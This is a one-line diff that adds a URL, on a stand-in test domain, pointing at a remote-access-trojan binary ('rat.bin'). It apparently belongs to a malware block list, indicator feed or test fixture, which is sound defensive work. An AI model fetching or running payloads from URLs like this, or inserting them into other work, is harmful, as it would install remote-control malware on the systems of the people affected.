@@ -1,0 +1,1 @@
+http://asyncrat-4.example.test/rat.bin
